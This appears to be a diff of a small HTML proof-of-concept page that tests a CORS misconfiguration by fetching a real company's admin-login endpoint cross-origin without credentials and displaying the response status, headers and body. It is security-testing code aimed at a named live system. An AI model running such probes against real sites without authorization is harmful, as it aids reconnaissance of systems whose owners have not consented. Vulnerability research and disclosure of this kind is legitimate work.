@@ -1,17 +1,31 @@
 <!doctype html>
 <html>
+<head><meta charset="utf-8"/><title>CORS PoC (no credentials)</title></head>
 <body>
-  <h3>CORS PoC — Read (no credentials)</h3>
-  <pre id="out">Running...</pre>
-  <script>
-    fetch("https://go.capital.com/v2/login/admin-login/", {
-      method: "GET",
-      // **مهم**: لا تستخدم credentials here
-      credentials: "omit"
-    })
-    .then(r => r.text())
-    .then(t => document.getElementById('out').textContent = t.slice(0,2000))
-    .catch(e => document.getElementById('out').textContent = 'Failed: ' + e);
-  </script>
+  <h2>CORS PoC — read-only (no credentials)</h2>
+  <p>This demonstrates a safe PoC: it <strong>omits credentials</strong> so browser allows reading when server returns ACAO: *</p>
+  <button id="run">Run fetch</button>
+  <pre id="out">Idle</pre>
+<script>
+document.getElementById('run').addEventListener('click', ()=>{
+  const out = document.getElementById('out');
+  out.textContent = 'Fetching...';
+  fetch("https://go.capital.com/v2/login/admin-login/", {
+    method: "GET",
+    credentials: "omit" // IMPORTANT: omit credentials to avoid credential-blocking
+  })
+  .then(r=>{
+    out.textContent = 'Status: ' + r.status + '\\n\\nHeaders:\\n';
+    for(const h of r.headers) out.textContent += h[0]+': '+h[1] + '\\n';
+    return r.text();
+  })
+  .then(body=>{
+    out.textContent += '\\nBody (first 3000 chars):\\n' + body.slice(0,3000)
+  })
+  .catch(e=>{
+    out.textContent = 'Failed: ' + e;
+  });
+});
+</script>
 </body>
 </html>
